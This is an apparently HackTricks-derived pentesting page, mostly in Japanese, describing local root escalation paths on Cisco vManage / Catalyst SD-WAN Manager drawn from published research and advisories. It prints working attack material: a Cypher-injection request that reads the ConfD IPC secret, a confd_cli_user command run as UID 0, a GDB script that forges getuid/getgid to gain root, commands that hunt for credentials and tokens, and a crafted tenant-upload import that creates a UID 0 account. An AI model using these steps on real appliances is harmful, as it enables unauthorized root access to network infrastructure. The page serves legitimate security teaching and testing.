# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* 上で `vmanage`、`netadmin`、または `vmanage-admin` として code execution を取得した場合、最も注目すべきローカル privesc の攻撃面は通常、`confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs、および root 所有の import/upload handler です。

controller 上でまだ **initial foothold** が必要な場合は、まず専用の control-plane ページを確認してください。

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
If `/etc/confd/confd_ipc_secret` が foothold から読み取り可能であれば、Path 1 と Path 2 はすぐに実行可能になります。remote file disclosure または webshell 経由で侵入した場合は、`vmanage-admin` の SSH マテリアルと multitenancy の upload handler も調査してください。最近の研究では、どちらも実行可能な pivot として利用できることが実証されています。<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Synacktiv の vManage assessment では、この root-shell path が記録されています。<sup>[[5]](#references)</sup>

レポートからリンクされている [ConfD ドキュメント](http://66.218.245.39/doc/html/rn03re18.html) では IPC authentication について説明されており、vManage の例では secret が `/etc/confd/confd_ipc_secret` に配置され、`vmanage` から読み取り可能であることが示されています。<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
報告されたセットアップでは Neo4j が `vmanage` 権限で実行されるため、先ほどの Cypher injection によって秘密ファイルを読み取れます。<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 自体はコマンドライン引数を受け付けず、`/usr/bin/confd_cli_user` を呼び出します。報告されたワークフローでは、その root-readable な helper を rootfs から抽出し、`scp` でコピーして help を読み取り、`CONFD_IPC_ACCESS_FILE` を設定したうえで、`-U 0 -G 0` を指定して呼び出し、root shell を取得します。<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

この代替ルートは、Walmart Global Tech による vManage 19.2.2 の調査を基にしています。<sup>[[6]](#references)</sup>

Synacktiv の手法では、報告された環境で root から読み取り可能な `/usr/bin/confd_cli_user` のコピーが必要です。一方、Walmart のレポートでは、GDB を使って `confd_cli` の identity values を変更しています。<sup>[[5]](#references)[[6]](#references)</sup>

レポートの disassembly では、`confd_cli` が caller の UID と GID を取得していることが示されています。<sup>[[6]](#references)</sup>

<details>
<summary>UID/GID の取得を示す Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

同じテストでは、root 所有の `cmdptywrapper` が明示的な `-g` および `-u` の値を受け取っていました。<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
研究者は、`confd_cli` がログインユーザーの UID と GID を `cmdptywrapper` に転送していると推測しました。<sup>[[6]](#references)</sup>

`cmdptywrapper` を `-g 0 -u 0` で直接実行すると、必要なファイルディスクリプタ（例では `-i 1015`）が利用できなかったため失敗しました。<sup>[[6]](#references)</sup>

`confd_cli` はこれらの値を引数として公開していないため、報告書では GDB を使用して `getuid()` と `getgid()` の戻り値を上書きしています。その appliance には GDB が存在していました。<sup>[[5]](#references)[[6]](#references)</sup>

`vmanage` access があれば、テストで `/etc/confd/confd_ipc_secret` を読み取ることができました。以下の script は、両方の identity call の戻り値をゼロに強制します。<sup>[[6]](#references)</sup>

報告書で使用された GDB script は次のとおりです。<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
報告されたコンソール出力は次のとおりです。<sup>[[6]](#references)</sup>

<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco は後に、[CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) に関する独自の advisory で、より簡潔なローカル root path を公開しました。**read-only privileges のみを持つ認証済み attacker** は、細不十分な input validation により、細工した request を manager CLI に送信して root を取得できました。<sup>[[7]](#references)</sup>

攻撃側の観点では、この advisory と以前の CLI research から、次の workflow が考えられます。<sup>[[6]](#references)[[7]](#references)</sup>

1. box 上で *何らかの* low-priv foothold を取得したら、より大掛かりな Path 1 / Path 2 workflow に進む前に、local CLI service をテストします。
2. Path 2 の artifacts を再利用して、trust boundary を特定します: `confd_cli` → `cmdptywrapper` → `vshell`。
3. CLI backend に転送されるすべての field を suspicious なものとして扱います: UID/GID、username、terminal metadata、imported files、または後から root-owned helper によって使用されるあらゆる value。
4. low-priv user が local CLI socket に到達し、それらの field に影響を与えられる場合、root の取得は crafted request を 1 つ送信するだけで可能かもしれません。

appliance に侵入した後は、次のように local CLI chain を調査します。<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
これは2025年のバグを再利用可能なハンティングパターンに変えるものです。つまり、**userlandでidentityを収集し、それをprivileged wrapperに転送する local CLI shim**を探します。<sup>[[6]](#references)[[7]](#references)</sup>

**CVE-2025-20122**と後発の**CVE-2026-20122**を混同しないでください。2025年の問題は*local*なCLIからrootへのバグである一方、2026年の問題は*remote*なAPIによる任意ファイル上書きであり、主にfootholdを設置してからPath 1 / Path 2 / Path 4を再確認する用途に有効です。<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4（2026 low-priv REST API to root - CVE-2026-20126）

Ciscoの2026年2月のadvisoryでは、別の有用なprivescクラスである[CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)について説明されています。**authenticatedなlocal attacker with low privileges**は、REST APIのuser-authentication mechanismが不十分であることを利用してroot権限を取得できます。<sup>[[1]](#references)</sup>

これは、vManageのprivescがもはや`confd`/TTY abuseに限定されないため重要です。low-priv shellを取得した後は、以下も探してください。<sup>[[1]](#references)</sup>

- callerを過度に信頼するlocalhost-only API endpoint
- 現在のaccountから読み取り可能なtoken、cookie、またはservice credential
- 依然としてlocalからtrigger可能な、`dataservice`/REST handlerを通じて公開されているroot-only action

実際には、`vmanage`または別のservice userとしてshellを取得したら、local API abuseはinteractive CLI abuseよりもautomateしやすい場合があります。<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
ローカルセッションのコンテキストだけで特権 REST 機能を利用できる場合は、API path を優先します。盗まれた web セッションや API tokens と組み合わせて replay、script 化、chain 化しやすいためです。<sup>[[1]](#references)</sup>

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

最近の別のパターンとして、[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) があります。`netadmin` privileges を持つ local attacker は、**crafted file** を upload できました。この file は後で CLI によって安全でない方法で処理され、`root` としての command injection につながりました。<sup>[[2]](#references)</sup>

HackTricks の観点では、価値のある technique は特定の CVE よりも広いものです。<sup>[[2]](#references)</sup>

1. file を受け付けるすべての CLI または web workflow を列挙します。import、diagnostic bundle、template、validator、backup、tenant data などが対象です。
2. upload された file がどこに配置され、どの root-owned script または binary がそれを処理するかを追跡します。
3. filename、file content、または parsed metadata が shell command、wrapper script、`system()` 形式の helper に渡されることがないか確認します。
4. すでに `netadmin` に到達できる場合（有効な credentials、盗まれた session、または auth-bypass chain）、file-processing bug は root への最短経路になることがよくあります。

その後、Google Cloud / Mandiant は、この bug class の具体例が multitenancy の import path を通じて exploit されたことを示しました。<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
観測された攻撃では、細工されたCSVによって`/etc/passwd`と`/etc/shadow`が変更され、一時的なUID 0アカウント（`troot`）が作成されました。これにより、`tenant-upload` / `tenant-list`形式のimporterは特に興味深い対象となります。これらは単なるデータ取り込み機能ではなく、root-owned parser front-endとなる可能性があるためです。<sup>[[4]](#references)</sup>

シェル側で簡単に調査するパターンは次のとおりです。
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
この bug class は、`root` ではなく `netadmin` を取得できる remote foothold と特にうまく chain します。<sup>[[2]](#references)[[4]](#references)</sup>

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – public research により、`confd_ipc_secret` または `vmanage-admin` の private key が露出する可能性が示されたため、特に価値が高いです。これにより、read bug を Path 1 または NETCONF pivot のいずれかに変換できます。<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 上記の 2025 CLI bug とは異なります。VulnCheck はこれを使用して webshell を upload しており、その後はこのページの local privesc paths が直ちに重要になります。<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – authenticated attacker は、影響を受ける user の web interface 上で script を実行できます。その結果得られる session context に、`vshell` または上記の local privesc paths に到達できる API/CLI actions が露出していないかを評価してください。<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – `netadmin` は 2026 crafted-file privesc に必要な level そのものであるため、Path 5 の非常に強力な precursor です。<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – CVE-2026-20122 と同様の offensive value がありますが、より新しい web UI upload path を介します。Cisco によると、この bug によって作成または上書きされた file は、後に root への elevate に使用できます。<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 年の intrusions では、攻撃者が古い vulnerable SD-WAN build に rollback し、旧 CLI root bug を悪用した後、元の version に restore できることが示されました。<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 詳細は専用の SD-WAN control-plane page に記載されています。この bug により `vmanage-admin` の SSH key を append でき、後続の management-plane actions 用に persistent NETCONF access を提供できます。<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller、Catalyst SD-WAN Manager、および Catalyst SD-WAN Validator の Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Cisco Catalyst SD-WAN Manager における Vulnerability (CVE-2026-20245) の Zero-Day Exploitation](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — CSRF から Remote Code Execution まで](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616 による Cisco Catalyst SD-WAN の Active exploitation (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Cisco Catalyst SD-WAN Controller における Critical authentication bypass](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
